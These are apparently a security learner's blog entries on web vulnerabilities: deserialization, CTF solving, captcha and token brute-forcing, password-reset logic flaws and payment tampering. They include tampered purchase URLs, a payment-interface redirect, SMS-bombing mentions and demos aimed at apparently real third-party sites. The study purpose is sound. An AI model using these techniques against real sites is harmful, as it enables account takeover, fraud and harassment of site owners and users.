        <content type="html"><![CDATA[<h2 id="WEB漏洞-反序列化之PHP-JAVA全解-下"><a href="#WEB漏洞-反序列化之PHP-JAVA全解-下" class="headerlink" title="WEB漏洞-反序列化之PHP&amp;JAVA全解(下)"></a><font size="6"><strong>WEB漏洞-反序列化之PHP&amp;JAVA全解(下)</strong></font></h2><span id="more"></span><h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p><img src="/2023/10/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-038/1.png"><br>Java中API实现：<br><img src="/2023/10/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-038/2.png"></p><h3 id="二、序列化理解"><a href="#二、序列化理解" class="headerlink" title="二、序列化理解"></a><font size="5"><strong>二、序列化理解</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#序列化和反序列化</span>序列化<span class="token punctuation">(</span>Serialization<span class="token punctuation">)</span>: 将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。反序列化：从存储区中读取该数据，并将其还原为对象的过程，成为反序列化。</code></pre><h3 id="三、演示案例"><a href="#三、演示案例" class="headerlink" title="三、演示案例"></a><font size="5"><strong>三、演示案例</strong></font></h3><p>● Java 反序列化及命令执行代码测试<br>● WebGoat_Javaweb 靶场反序列化测试  </p><p><strong>补充知识点</strong><br>下方的特征可以作为序列化的标志参考:<br>一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据。<br>或者如果以aced开头，那么他就是这一段java序列化的16进制。|</p><h4 id="webgoat反序列"><a href="#webgoat反序列" class="headerlink" title="webgoat反序列"></a><font size="4"><strong>webgoat反序列</strong></font></h4><pre class=" language-bash"><code class="language-bash">jiang@ubuntu:~$ docker pull webgoat/webgoat-8.0jiang@ubuntu:~$ docker run -d -p 8080:8080 webgoat/webgoat-8.0:latest</code></pre><p><a href="http://10.1.1.7:8080/WebGoat/login">http://10.1.1.7:8080/WebGoat/login</a><br><img src="/2023/10/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-038/3.png"><br><img src="/2023/10/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-038/4.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-037</title>
      <link href="/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/"/>
      <url>/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-反序列化之PHP-JAVA全解-上"><a href="#WEB漏洞-反序列化之PHP-JAVA全解-上" class="headerlink" title="WEB漏洞-反序列化之PHP&amp;JAVA全解(上)"></a><font size="6"><strong>WEB漏洞-反序列化之PHP&amp;JAVA全解(上)</strong></font></h2><span id="more"></span><h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p><img src="/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/1.png"><br><img src="/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/2.png"></p><h3 id="二、PHP反序列化"><a href="#二、PHP反序列化" class="headerlink" title="二、PHP反序列化"></a><font size="5"><strong>二、PHP反序列化</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#PHP 反序列化</span>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。serialize<span class="token punctuation">(</span><span class="token punctuation">)</span> //将一个对象转换成一个字符串unserialize<span class="token punctuation">(</span><span class="token punctuation">)</span> //将字符串还原成一个对象触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：参考：https://www.cnblogs.com/20175211lyz/p/11403397.html__construct<span class="token punctuation">(</span><span class="token punctuation">)</span>//创建对象时触发__destruct<span class="token punctuation">(</span><span class="token punctuation">)</span> //对象被销毁时触发__call<span class="token punctuation">(</span><span class="token punctuation">)</span> //在对象上下文中调用不可访问的方法时触发__callStatic<span class="token punctuation">(</span><span class="token punctuation">)</span> //在静态上下文中调用不可访问的方法时触发__get<span class="token punctuation">(</span><span class="token punctuation">)</span> //用于从不可访问的属性读取数据__set<span class="token punctuation">(</span><span class="token punctuation">)</span> //用于将数据写入不可访问的属性__isset<span class="token punctuation">(</span><span class="token punctuation">)</span> //在不可访问的属性上调用 isset<span class="token punctuation">(</span><span class="token punctuation">)</span>或 empty<span class="token punctuation">(</span><span class="token punctuation">)</span>触发__unset<span class="token punctuation">(</span><span class="token punctuation">)</span> //在不可访问的属性上使用 unset<span class="token punctuation">(</span><span class="token punctuation">)</span>时触发__invoke<span class="token punctuation">(</span><span class="token punctuation">)</span> //当脚本尝试将对象调用为函数时触发</code></pre><h4 id="无类测试"><a href="#无类测试" class="headerlink" title="无类测试"></a><font size="4"><strong>无类测试</strong></font></h4><p>● serialize<br><img src="/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/3.png"></p><p>● unserialize<br><img src="/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/4.png"></p><h4 id="有类测试"><a href="#有类测试" class="headerlink" title="有类测试"></a><font size="4"><strong>有类测试</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php    class ABC<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    public <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> __construct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$test</span> <span class="token operator">=</span> 1<span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'调用了构造函数&lt;br>'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token keyword">function</span> __destruct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token keyword">echo</span> <span class="token string">'调用了析构函数&lt;br>'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token keyword">function</span> __wakeup<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token keyword">echo</span> <span class="token string">'调用了苏醒函数&lt;br>'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">echo</span> <span class="token string">'创建对象a&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> new ABC<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'序列化&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$a_ser</span><span class="token operator">=</span>serialize<span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'反序列化&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$a_unser</span><span class="token operator">=</span>unserialize<span class="token punctuation">(</span><span class="token variable">$a_ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'对象快要死了！'</span><span class="token punctuation">;</span>?<span class="token operator">></span>运行结果创建对象a<span class="token operator">&lt;</span>br<span class="token operator">></span>调用了构造函数<span class="token operator">&lt;</span>br<span class="token operator">></span>序列化<span class="token operator">&lt;</span>br<span class="token operator">></span>反序列化<span class="token operator">&lt;</span>br<span class="token operator">></span>调用了苏醒函数<span class="token operator">&lt;</span>br<span class="token operator">></span>对象快要死了！调用了析构函数<span class="token operator">&lt;</span>br<span class="token operator">></span>调用了析构函数<span class="token operator">&lt;</span>br<span class="token operator">></span></code></pre><p><img src="/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/5.png"></p><h3 id="三、ctf真题bugku"><a href="#三、ctf真题bugku" class="headerlink" title="三、ctf真题bugku"></a><font size="5"><strong>三、ctf真题bugku</strong></font></h3><p><a href="https://ctf.bugku.com/challenges#flag.php">https://ctf.bugku.com/challenges#flag.php</a><br><img src="/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/6.png"><br><img src="/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/7.png"></p><p>但是flag没有显示，原因是上面的请求了Hint。看源代码中的if和elseif，是这里的原因。<br>但是删除了?hint&#x3D;1111之后，再请求，发现还是不对。原因是代码执行顺序的问题。这又是一个坑。<br><img src="/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/8.png"></p><p>所以我们传入Cookie的值应该为：<br><img src="/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/9.png"></p><p>修改cookie<br><img src="/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/10.png"></p><p>得到flag<br><img src="/2023/10/20/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-037/11.png"></p><h3 id="四、涉及资源："><a href="#四、涉及资源：" class="headerlink" title="四、涉及资源："></a><font size="5"><strong>四、涉及资源：</strong></font></h3><p><a href="http://www.dooccn.com/php/">http://www.dooccn.com/php/</a><br><a href="https://www.ctfhub.com/#/challenge">https://www.ctfhub.com/#/challenge</a><br><a href="https://ctf.bugku.com/challenges#flag.php">https://ctf.bugku.com/challenges#flag.php</a><br><a href="https://cgctf.nuptsast.com/challenges#Web">https://cgctf.nuptsast.com/challenges#Web</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-036</title>
      <link href="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/"/>
      <url>/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-逻辑越权之找回机制及接口爆破"><a href="#WEB漏洞-逻辑越权之找回机制及接口爆破" class="headerlink" title="WEB漏洞-逻辑越权之找回机制及接口爆破"></a><font size="6"><strong>WEB漏洞-逻辑越权之找回机制及接口爆破</strong></font></h2><span id="more"></span><h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/1.png"><br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/2.png"></p><h3 id="二、演示案例"><a href="#二、演示案例" class="headerlink" title="二、演示案例"></a><font size="5"><strong>二、演示案例</strong></font></h3><p>● 验证码识别插件及工具操作演示-实例。<br>● 验证码绕过本地及远程验证-本地及实例<br>● Token客户端回显绕过登录爆破演示-<br>● 本地某URL下载接口ID值调用遍历测试-实例<br>● Callback自定义返回调用安全-漏洞测试-实例<br>● 补:上述在实战中如何做到漏洞发现-bp功能点</p><p><strong>验证码安全</strong></p><p>● 分类: 图片，手机或邮箱，语音，视频，操作等<br>● 原理: 验证生成或验证过程中的逻辑问题<br>● 危害: 账户权限泄漏，短信轰炸，遍历，任意用户操作等<br>● 漏洞: 客户端回显(已讲)，验证码复用，验证码爆破(已讲)，绕过等</p><p><strong>token 安全</strong><br>● 基本上述同理，主要是验证中可存在绕过可继续后续测试<br>● token 爆破，token 客户端回显等  </p><p><strong>验证码识别插件工具使用</strong><br>● captcha-killer<br>● Pkav_Http_Fuzz<br>● reCAPTCHA 等  </p><p><strong>接口安全问题</strong><br>● 调用，遍历，未授权，篡改等<br>● 调用案例：短信轰炸<br>● 遍历案列：UID 等遍历<br>● callback 回调 JSONP<br>● 参数篡改：墨者靶场  </p><p><strong>水平越权</strong></p><pre class=" language-bash"><code class="language-bash">未授权访问：与越权漏洞区别Jboss 未授权访问Jenkins 未授权访问ldap 未授权访问Redis 未授权访问elasticsearch 未授权访问MenCache 未授权访问Mongodb 未授权访问Rsync 未授权访问Zookeeper 未授权访问Docker 未授权访问</code></pre><h3 id="三、涉及资源："><a href="#三、涉及资源：" class="headerlink" title="三、涉及资源："></a><font size="5"><strong>三、涉及资源：</strong></font></h3><pre class=" language-bash"><code class="language-bash">https://www.lanzous.com/i1z2s3e 或者 https://sec.kim/wp-content/uploads/2021/01/PKAV-HTTP-Fuzzer-1.5.6.ziphttps://www.cnblogs.com/nul1/p/12071115.htmlhttps://github.com/c0ny1/captcha-killer/releases/tag/0.1.2https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0</code></pre><h3 id="四、工具操作演示"><a href="#四、工具操作演示" class="headerlink" title="四、工具操作演示"></a><font size="5"><strong>四、工具操作演示</strong></font></h3><h4 id="Pkav-Http-Fuzz工具"><a href="#Pkav-Http-Fuzz工具" class="headerlink" title="Pkav_Http_Fuzz工具"></a><font size="4"><strong>Pkav_Http_Fuzz工具</strong></font></h4><pre class=" language-bash"><code class="language-bash">https://www.lanzous.com/i1z2s3e 或者 https://sec.kim/wp-content/uploads/2021/01/PKAV-HTTP-Fuzzer-1.5.6.zip</code></pre><p><a href="https://manage.yyxueche.com//panel/login.php">https://manage.yyxueche.com//panel/login.php</a></p><p><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/3.png"></p><p>获取到验证码地址：<a href="https://manage.yyxueche.com/panel/verify_code_cn.php">https://manage.yyxueche.com/panel/verify_code_cn.php</a><br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/4.png"></p><p>优点:简单好用<br>缺点:不能配合burp使用</p><h4 id="captcha-killer"><a href="#captcha-killer" class="headerlink" title="captcha-killer"></a><font size="4"><strong>captcha-killer</strong></font></h4><p> <a href="https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2">https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2</a><br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/5.png"></p><p>工具使用介绍：<a href="https://www.cnblogs.com/nul1/p/12071115.html">https://www.cnblogs.com/nul1/p/12071115.html</a><br>插件要配合百度AI文字识别使用。<br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/6.png"></p><p>由于穷后面的实验没得法继续做</p><h3 id="五、pikachu爆破"><a href="#五、pikachu爆破" class="headerlink" title="五、pikachu爆破"></a><font size="5"><strong>五、pikachu爆破</strong></font></h3><h4 id="on-server"><a href="#on-server" class="headerlink" title="on server"></a><font size="4"><strong>on server</strong></font></h4><p>将数据包的用户名修改重复发送看回显的值是否发生变化。可以看出验证码存在复用的问题。<br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/7.png"><br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/8.png"></p><p>原因是没有销毁这个验证码。这个验证码存储在SESSION中。</p><h4 id="onclient"><a href="#onclient" class="headerlink" title="onclient"></a><font size="4"><strong>onclient</strong></font></h4><p><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/9.png"></p><p>在前端验证当中有的程序员会单独写一个js文件然后去加载<script src="1.js"></script> </p><h4 id="token"><a href="#token" class="headerlink" title="token"></a><font size="4"><strong>token</strong></font></h4><pre class=" language-bash"><code class="language-bash">1、Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。2、Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。3、使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</code></pre><p>抓包发送到intruder模块当中<br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/10.png"></p><p><font color=red>在表达式中输入value&#x3D;’然后点击refetch response 找到value后的token值复制，最后点击ok</font></p><p><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/11.png"><br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/12.png"></p><p>设置线程数新版的burp和老版burp的差异，其实这里面还有很多的文章可以做，这里不展开叙述了。<br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/13.png"></p><p>然后设置payloads<br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/14.png"><br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/15.png"></p><p>最后start，看到成功<br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/16.png"><br><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/17.png"></p><p>总结：其实token的爆破还是非常麻烦的因为要爆破的东西非常多，如用户名，密码、token、要是字典比较大的话那么一时半会根本是爆破不完的。</p><p>由于之前对Pitchfork攻击类型不熟悉。在网上看了关于四种的攻击类型，作简要的陈述。</p><h4 id="1、Sniper（狙击手模式）"><a href="#1、Sniper（狙击手模式）" class="headerlink" title="1、Sniper（狙击手模式）"></a><font size="4"><strong>1、Sniper（狙击手模式）</strong></font></h4><p>针对单一密码，假设确定了两个位置A和B，然后密码包payload里有两个密码1、2，那么攻击模式如下：</p><table>    <thead>        <tr>            <th>Attack No.</th>            <th>Position A</th>            <th>Position B</th>        </tr>    </thead>    <tbody>        <tr>            <td>0</td>            <td>1</td>            <td>null</td>        </tr>        <tr>            <td>1</td>            <td>2</td>            <td>null</td>        </tr>         <tr>            <td>2</td>            <td>null</td>            <td>1</td>        </tr>         <tr>            <td>3</td>            <td>null</td>            <td>2</td>        </tr>    </tbody></table>     <h4 id="2、Battering-ram（攻城锤模式）"><a href="#2、Battering-ram（攻城锤模式）" class="headerlink" title="2、Battering ram（攻城锤模式）"></a><font size="4"><strong>2、Battering ram（攻城锤模式）</strong></font></h4><p>于sniper模式不同的地方在于，同样情况下，攻击次数减半，每次两个位置<br>用同样的密码，如表：</p><table>    <thead>        <tr>            <th>Attack No.</th>            <th>Position A</th>            <th>Position B</th>        </tr>    </thead>    <tbody>        <tr>            <td>0</td>            <td>1</td>            <td>1</td>        </tr>        <tr>            <td>1</td>            <td>2</td>            <td>2</td>        </tr>    </tbody></table><h4 id="3、Pitchfork（叉子模式）"><a href="#3、Pitchfork（叉子模式）" class="headerlink" title="3、Pitchfork（叉子模式）"></a><font size="4"><strong>3、Pitchfork（叉子模式）</strong></font></h4><p>跟前两种不同的地方在于，可以多组密码本payload，又于battering ram相同的地方在于，一一对应，现在添加包含3、4的密码本payload，暴力破解过程如表：</p><table>    <thead>        <tr>            <th>Attack No.</th>            <th>Position A</th>            <th>Position B</th>        </tr>    </thead>    <tbody>        <tr>            <td>0</td>            <td>1</td>            <td>3</td>        </tr>        <tr>            <td>1</td>            <td>2</td>            <td>4</td>        </tr>    </tbody></table><h4 id="4、Cluster-bomb（炸弹模式"><a href="#4、Cluster-bomb（炸弹模式" class="headerlink" title="4、Cluster bomb（炸弹模式"></a><font size="4"><strong>4、Cluster bomb（炸弹模式</strong></font></h4><p>跟叉子模式相似的是多个密码本对应多个位置，不同的是不再是一一对应，而是交叉组合，每一个密码本里的密码都对应于另一密码本所有密码，如表：</p><table>    <thead>        <tr>            <th>Attack No.</th>            <th>Position A</th>            <th>Position B</th>        </tr>    </thead>    <tbody>        <tr>            <td>0</td>            <td>1</td>            <td>3</td>        </tr>        <tr>            <td>1</td>            <td>2</td>            <td>3</td>        </tr>        <tr>            <td>2</td>            <td>1</td>            <td>4</td>        </tr>        <tr>Z            <td>3</td>            <td>2</td>            <td>4</td>        </tr>    </tbody></table><h3 id="六、接口回调安全问题例"><a href="#六、接口回调安全问题例" class="headerlink" title="六、接口回调安全问题例"></a><font size="5"><strong>六、接口回调安全问题例</strong></font></h3><p><img src="/2023/10/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-036/18.png"><br>callback容易产生跨站漏洞：inurl:callback<br>那么这些漏洞该怎么发现呢？可以使用bp爬虫</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-035</title>
      <link href="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/"/>
      <url>/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-逻辑越权之找回机制及接口爆破"><a href="#WEB漏洞-逻辑越权之找回机制及接口爆破" class="headerlink" title="WEB漏洞-逻辑越权之找回机制及接口爆破"></a><font size="6"><strong>WEB漏洞-逻辑越权之找回机制及接口爆破</strong></font></h2><span id="more"></span><p><img src="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/1.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#找回重置机制</span>客户端回显，Response 状态值，验证码爆破，找回流程绕过等<span class="token comment" spellcheck="true">#接口调用乱用</span>短信轰炸，来电轰炸等</code></pre><h3 id="一、演示案例"><a href="#一、演示案例" class="headerlink" title="一、演示案例"></a><font size="5"><strong>一、演示案例</strong></font></h3><p>● 找回密码验证码逻辑-爆破测试-实例<br>● 墨者靶场密码重置-验证码套用-靶场<br>● 手机邮箱验证码逻辑-客户端回显-实例<br>● 绑定手机验证码逻辑-Rep 状态值篡改-实例<br>● 某 APP 短信轰炸接口乱用-实例接口调用发包  </p><h3 id="二、涉及资源"><a href="#二、涉及资源" class="headerlink" title="二、涉及资源"></a><font size="5"><strong>二、涉及资源</strong></font></h3><pre class=" language-bash"><code class="language-bash">http://downcode.com/downcode/j_16621.shtmlhttps://pan.baidu.com/share/init?surl<span class="token operator">=</span>P73QFmEhY6f350CvmnOJNg 提取码小https://pan.baidu.com/share/init?surl<span class="token operator">=</span>N963jFjTefNc6Gnso-RHmw 提取码xiaohttps://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe</code></pre><h3 id="三、墨者靶场"><a href="#三、墨者靶场" class="headerlink" title="三、墨者靶场"></a><font size="5"><strong>三、墨者靶场</strong></font></h3><p>漏洞分析原因</p><pre class=" language-bash"><code class="language-bash">第一个页面：第一个页面输入手机号，验证码第二个页面：重置密码刚好靶场是这么一个流程 手机号 新密码 图片验证码,短信验证码这样就行了一个后台更改数据包发送的手机号也就获取到了验证码</code></pre><p>1、打开靶场进入操作界面，发现有一个已经注册的手机号<br><img src="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/2.png"></p><p>2、使用测试号码获取短信验证码<br><img src="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/3.png"></p><p>3、将手机号改为需要登录的手机号，点击重置，成功获取key值<br><img src="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/4.png"></p><p>其短信验证码5分钟内有效，只验证验证码的有效性，而没有验证验证码和手机号的一致性。所以可以越权重置。</p><h3 id="四、汉川招聘网"><a href="#四、汉川招聘网" class="headerlink" title="四、汉川招聘网"></a><font size="5"><strong>四、汉川招聘网</strong></font></h3><p><a href="http://0712zpw.com/user/user_getpass.php">http://0712zpw.com/user/user_getpass.php</a><br><img src="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/5.png"><br><img src="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/6.png"></p><p>汉川招聘源码采用的是74cms，下载下来分析，切记不要直接在公网上直接开整，不然的话网安法问候<br><a href="https://74cms.com/downloadse/show/id/52.html">https://74cms.com/downloadse/show/id/52.html</a></p><h3 id="五、手机验证码"><a href="#五、手机验证码" class="headerlink" title="五、手机验证码"></a><font size="5"><strong>五、手机验证码</strong></font></h3><p><img src="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/7.png"><br><img src="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/8.png"></p><p>属于客户端回显。<br><img src="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/9.png"></p><p>写个手机号码，然后随便填验证码，抓包。<br><img src="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/10.png"></p><p>直接替换为正确的验证码就可以。或者也可以修改返回的包，<br><img src="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/11.png"></p><p>在上面填写正确的验证码的情况下，返回1。而填写错误的验证码会返回3，我们将3修改为1即可。<br>但是这就涉及到，这个web应用到底是怎么验证的，是以返回包来验证，还是在服务器端验证。在服务器验证的话，改为1也没用。<br>bp抓取回复的数据包<br><img src="/2023/10/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-035/12.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-034</title>
      <link href="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/"/>
      <url>/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-逻辑越权之支付数据篡改安全"><a href="#WEB漏洞-逻辑越权之支付数据篡改安全" class="headerlink" title="WEB漏洞-逻辑越权之支付数据篡改安全"></a><font size="6"><strong>WEB漏洞-逻辑越权之支付数据篡改安全</strong></font></h2><span id="more"></span><p><img src="/2023/10/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-034/1.png"></p><h3 id="一、涉及知识"><a href="#一、涉及知识" class="headerlink" title="一、涉及知识"></a><font size="5"><strong>一、涉及知识</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#登录应用功能点安全问题</span>检测功能点，检测，危害，修复方案等1.登录点暴力破解2.HTTP/HTTPS 传输3.Cookie 脆弱点验证4.Session 固定点测试5.验证密文比对安全测试<span class="token comment" spellcheck="true">#数据篡改安全问题</span>原理，检测，危害，修复等参考：https://www.secpulse.com/archives/67080.html<span class="token comment" spellcheck="true">#商品购买流程：</span>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付<span class="token comment" spellcheck="true">#常见篡改参数：</span>商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等<span class="token comment" spellcheck="true">#常见修改方法：</span>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等6000 大米测试产品/index.php?m<span class="token operator">=</span>Member<span class="token operator">&amp;</span>a<span class="token operator">=</span>gobuy<span class="token operator">&amp;</span>iscart<span class="token operator">=</span>0<span class="token operator">&amp;</span>id<span class="token operator">=</span>127<span class="token operator">&amp;</span>name<span class="token operator">=</span>%E5%A4%A7%E7%B1%B3%E6%B5%8B%E8%AF%95%E4%BA%A7%E5%93%81<span class="token operator">&amp;</span>qty<span class="token operator">=</span>1<span class="token operator">&amp;</span>price<span class="token operator">=</span>6000<span class="token operator">&amp;</span>gtype<span class="token operator">=</span>%E7%81%B0%E8%89%B2<span class="token operator">&amp;</span>pic<span class="token operator">=</span>/Public/Uploads/thumb/thumb_1393218295.jpg5400 大米手机 cms/index.php?m<span class="token operator">=</span>Member<span class="token operator">&amp;</span>a<span class="token operator">=</span>gobuy<span class="token operator">&amp;</span>iscart<span class="token operator">=</span>0<span class="token operator">&amp;</span>id<span class="token operator">=</span>70<span class="token operator">&amp;</span>name<span class="token operator">=</span>%E5%A4%A7%E7%B1%B3%E6%89%8B%E6%9C%BACMS<span class="token operator">&amp;</span>qty<span class="token operator">=</span>2<span class="token operator">&amp;</span>price<span class="token operator">=</span>5400<span class="token operator">&amp;</span>gtype<span class="token operator">=</span>%E7%81%B0%E8%89%B2<span class="token operator">&amp;</span>pic<span class="token operator">=</span>/Public/Uploads/thumb/thumb_1393218295.jpgindex.php?s<span class="token operator">=</span>/wap/pay/wchatQrcodePay 微信支付index.php?s<span class="token operator">=</span>/wap/pay/alipay 支付宝支付index.php?s<span class="token operator">=</span>http://www.xiaodi8.com/alipay 调用其他的支付接口<span class="token variable">$pay_name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>6000 是存储到数据库里，安全的做法：以数据库的数据值为准</code></pre><h3 id="二、涉及资源"><a href="#二、涉及资源" class="headerlink" title="二、涉及资源"></a><font size="5"><strong>二、涉及资源</strong></font></h3><pre class=" language-bash"><code 